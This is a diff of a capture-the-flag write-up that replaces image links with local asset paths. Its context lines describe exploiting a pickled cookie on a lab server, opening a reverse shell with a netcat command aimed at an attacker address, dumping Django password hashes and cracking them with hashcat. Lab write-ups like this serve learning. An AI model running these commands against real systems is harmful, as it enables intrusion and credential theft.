@@ -21,11 +21,11 @@ PORT     STATE SERVICE
 Nmap done: 1 IP address (1 host up) scanned in 69.44 seconds
 ```
 Looking at the website at the single open port there are tasty recipes that hint to Python Pickle deserialization vulnerability.
-![](https://i.imgur.com/e8CAVah.png)
+
+![]({{ site.url }}/assets/unbakedpie/pie.png)
 Enumerating the site I can confirm that there is a Pickled cookie in the search functionality:
 
-![](https://i.imgur.com/yoH1fyz.png)
-
+![]({{ site.url }}/assets/unbakedpie/cookie.png)
 
 I test that exploiting this works and yes. I can create files in the local file system and serve them over HTTP. I then create a Python exploit to easily run commands on the server:
 
@@ -37,7 +37,7 @@ After looking for flags etc. for a while I decide that it’s time for a reverse
 python3 exploit.py http://10.10.106.195:5003 "/bin/nc -e /bin/sh 10.8.108.247 4444 "
 ```
 Enumerating the host we can dump Django credentials from /home/site/db.sqlite3:
-![](https://i.imgur.com/2xhwnUt.png)
+![]({{ site.url }}/assets/unbakedpie/hashes.png)
 
 ```bash=
 hashcat -m 10000 hashes /usr/share/wordlists/rockyou.txt
